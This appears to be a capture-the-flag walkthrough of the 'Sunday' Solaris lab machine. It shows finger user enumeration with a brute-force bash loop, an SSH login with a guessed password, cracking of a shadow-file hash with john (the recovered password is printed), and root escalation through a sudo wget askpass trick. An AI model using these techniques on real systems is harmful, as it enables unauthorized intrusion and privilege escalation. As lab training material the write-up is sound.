ME: 
```ME
10.10.15.8
```

TARGET:
```target
10.129.28.246
```

# NMAP

```
Nmap scan report for 10.129.28.246
Host is up (0.028s latency).
Not shown: 39409 closed tcp ports (reset), 26121 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
79/tcp    open  finger?
|_finger: No one logged on\x0D
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where
111/tcp   open  rpcbind 2-4 (RPC #100000)
515/tcp   open  printer
6787/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
```

# Port 79 - Finger

This seems to be an old protocol to see who is logged in at the same time on the box according to Wikipedia. Used Hacktrix commands against it but got nothing back as a listing of users logged on. Looks like I can however pass in a user over nc and get results back. Was able to do this for root:

```
└─$ echo "root" | nc -vn 10.129.28.246 79 -vn
(UNKNOWN) [10.129.28.246] 79 (finger) open
Login       Name               TTY         Idle    When    Where
root     Super-User            console      <Dec  7, 2023>
 sent 5, rcvd 126
```

To brute force this instead, wrote a quick bash loop:

```
while read -r user; do
echo $user | nc -vn 10.129.28.246 79 -vn | grep '>'
done < /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt 2>/dev/null
```

This shows a few users but some of them have a TTY (ssh) they've logged in from:

```
dm      Admin                              < .  .  .  . >
dladm    Datalink Admin                     < .  .  .  . >
netadm   Network Admin                      < .  .  .  . >
netcfg   Network Configuratio               < .  .  .  . >
dhcpserv DHCP Configuration A               < .  .  .  . >
ikeuser  IKE Admin                          < .  .  .  . >
lp       Line Printer Admin                 < .  .  .  . >
root     Super-User            console      <Dec  7, 2023>
nobody   NFS Anonymous Access               < .  .  .  . >
noaccess No Access User                     < .  .  .  . >
nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >
sammy           ???            ssh          <May  6, 2025> 10.10.14.68         
pkg5srv  pkg(7) server UID                  < .  .  .  . >
pkg5srv  pkg(7) server UID                  < .  .  .  . >
pkg5srv  pkg(7) server UID                  < .  .  .  . >
sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         
bin             ???                         < .  .  .  . >
pkg5srv  pkg(7) server UID                  < .  .  .  . >
netadm   Network Admin                      < .  .  .  . >
netcfg   Network Configuratio               < .  .  .  . >
nobody   NFS Anonymous Access               < .  .  .  . >
pkg5srv  pkg(7) server UID                  < .  .  .  . >
pkg5srv  pkg(7) server UID                  < .  .  .  . >
adm      Admin                              < .  .  .  . >
dladm    Datalink Admin                     < .  .  .  . >
netadm   Network Admin                      < .  .  .  . >
netcfg   Network Configuratio               < .  .  .  . >
dhcpserv DHCP Configuration A               < .  .  .  . >
ikeuser  IKE Admin                          < .  .  .  . >
lp       Line Printer Admin                 < .  .  .  . >
```

Users sammy and sunny stand out here (along with root) as having logged in over ssh sometime in the past.

As this points at ssh being enabled for this user and there is not much else in terms of ports, I tried to ssh on the 22022 port for the sunny user. Giving the name of the box "sunday" in all lowercase worked as the password:

```
└─$ ssh sunny@10.129.28.246 -p 22022
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
(sunny@10.129.28.246) Password: 
(sunny@10.129.28.246) Password: 
Last login: Wed Apr 13 15:35:50 2022 from 10.10.14.13
Oracle Solaris 11.4.42.111.0                  Assembled December 2021
sunny@sunday:~$ ls
```

In the root of the Filesystem, there is a backup folder with what appears to be /etc/shadow files with password hashes for sammy and sunny users. This is likely the pivot from sunny to sammy (which I already saw has the user.txt flag file). I also found by checking sudo perms that I can run a /root/troll binary but it seems to not be a known GTFOBIN and has nothing else I could find.

So, getting the hash from the shadow file in the /backup folder:

```
sunny@sunday:/backup$ cat shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

Cracking the hash for the sammy user worked:

```
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt                   
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cooldude!        (?)     
1g 0:00:00:22 DONE (2026-07-15 04:23) 0.04494g/s 9204p/s 9204c/s 9204C/s ing456..bluenote
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Used ssh to login again but as sammy user:

```
└─$ ssh sammy@10.129.28.246 -p 22022
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
(sammy@10.129.28.246) Password: 
Last login: Tue May  6 07:37:14 2025 from 10.10.14.68
Oracle Solaris 11.4.42.111.0                  Assembled December 2021
-bash-5.1$ id
uid=100(sammy) gid=10(staff)
-bash-5.1$ 
```

Now I am able to use wget as root via sudo:

```
-bash-5.1$ sudo -l
User sammy may run the following commands on sunday:
    (root) NOPASSWD: /usr/bin/wget
-bash-5.1$ 
```

This is a known GTFOBIN with ability to give a shell

```
-bash-5.1$ echo -e '#!/bin/sh\n/bin/sh 1>&0' >/tmp/gtfo
-bash-5.1$ chmod +x gtfo
-bash-5.1$ sudo /usr/bin/wget --use-askpass=/tmp/gtfo 0
root@sunday:/tmp# whoami
root
```

Got a shell as root and able to read both flags

==DONE==